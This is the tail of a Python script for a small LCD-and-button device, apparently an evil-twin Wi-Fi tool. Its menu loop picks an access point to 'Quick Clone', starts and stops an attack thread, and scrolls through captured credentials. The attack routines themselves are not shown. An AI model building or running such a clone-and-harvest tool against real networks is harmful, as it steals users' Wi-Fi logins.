                elif btn == "LEFT":
                    with lock:
                        if ap_list and scroll_pos < len(ap_list):
                            target = ap_list[scroll_pos]
                            status_msg = f"Quick Clone: {target['ssid'][:14]}"
                    if ap_list:
                        threading.Thread(
                            target=_start_attack, args=(target,), daemon=True,
                        ).start()
                    time.sleep(0.3)
                elif btn == "KEY2":
                    with lock:
                        view_mode = "creds"
                        scroll_pos = 0
                    time.sleep(0.25)
                draw_scan_view()

            elif view_mode == "attack":
                if btn == "KEY2":
                    with lock:
                        view_mode = "creds"
                        scroll_pos = 0
                    time.sleep(0.25)
                elif btn == "OK":
                    with lock:
                        running = attack_running
                    if running:
                        threading.Thread(target=_stop_attack, daemon=True).start()
                    time.sleep(0.3)
                draw_attack_view()

            elif view_mode == "creds":
                if btn == "UP":
                    with lock:
                        scroll_pos = max(0, scroll_pos - 1)
                    time.sleep(0.15)
                elif btn == "DOWN":
                    with lock:
                        scroll_pos = min(max(0, len(credentials) - 1), scroll_pos + 1)
                    time.sleep(0.15)
                draw_creds_view()

            time.sleep(0.05)

    finally:
        _stop_attack()
        try:
            LCD.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
